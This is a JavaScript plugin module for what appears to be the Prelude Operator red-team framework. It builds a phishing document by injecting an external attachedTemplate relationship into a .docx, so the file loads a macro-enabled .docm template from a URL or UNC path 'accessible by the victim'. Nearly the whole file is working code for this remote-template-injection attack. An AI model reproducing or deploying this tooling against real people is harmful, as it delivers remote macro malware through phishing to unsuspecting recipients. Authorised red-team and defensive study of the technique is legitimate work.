/**
 * docx builder module for the PayloadBuilder Prelude Operator plugin.
 * 
 * Motivation: https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros
 * 
 * Author: obsintax
 */
exports.default = {
    name: 'docx-template',
    description: 'insert a docm template reference into a docx file.',
    args: [
        {
            name: 'docx',
            label: 'input file (.docx) from current uploaded payloads',
            type: 'list',
            choices: () => {
                return getPayloads().then(payloads => 
                    payloads.map(payload => [path.parse(payload).base, payload])
                )
            }
        },
        {
            name: 'template',
            label: 'location of the template (.docm) accessible by the victim. (e.g. Web URL, network UNC)',
            type: 'string'
        }
    ],
    executor: ({ docx, template }) => {
        return updateDocxTemplate(docx, template);
    }
}

/**
 * Returns a list of existing payloads (fullpath) within the payloads/uploads dir
 * @returns {Array} array that contains payload file paths
 */
let getPayloads = () => {
    return Requests.fetchOperator('/internal/config/settings', {
        method: 'GET'
    })
    .then(res => res.json())
    .then(settings => {
        return path.join(settings.local.workspace, 'payloads/manual/uploads');
    })
    .then((payloadDir) => Basic.recursiveFiles(payloadDir));
}

/**
 * Returns a docx file containing the inserted docm template reference
 * @param {String} inputDocxPath absolute filepath to the input docx
 * @param {String} docmLocation web url or network UNC path to a .docm template
 * @returns Buffer containing the modified plaintext .docx file
 */
 let updateDocxTemplate = (inputDocxPath, docmLocation) => {
     // TODO: use this flag in the future when logic is added to allow users 
     //       the option to upload files (not encrypted), instead of only 
     //       selecting an existing one in the payloads dir (encrypted).

    let encrypted = true; 

    if (!encrypted) {
        return updateDocxTemplateDec(
            fs.readFileSync(inputDocxPath, "binary"),
            docmLocation
        );
    } else {
        return updateDocxTemplateDec(
            Encryption.decryptBuffer(fs.readFileSync(inputDocxPath)),
            docmLocation
        );
    }
}

/**
 * Helper function that performs the docx file modification
 * @param {Buffer} docxPayloadBuf Buffer containing the contents of the docx file
 * @param {String} docmLocation web url or network UNC path to a .docm template
 * @returns 
 */
let updateDocxTemplateDec = (docxPayloadBuf, docmLocation) => {
    // template ref xml
    let xml = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="${docmLocation}" TargetMode="External"/>\n</Relationships>`;

    // Unzip the docx into memory
    const zip = new PizZip(docxPayloadBuf);        
    
    // update the settings.xml.rels xml file within the zip
    zip.file("word/_rels/settings.xml.rels", xml);

    // zip the files back up
    var buffer = zip.generate({
        type: "nodebuffer",
        compression: "DEFLATE",
        compressionOptions: {
            level: 1
        }
    });

    return buffer;
}

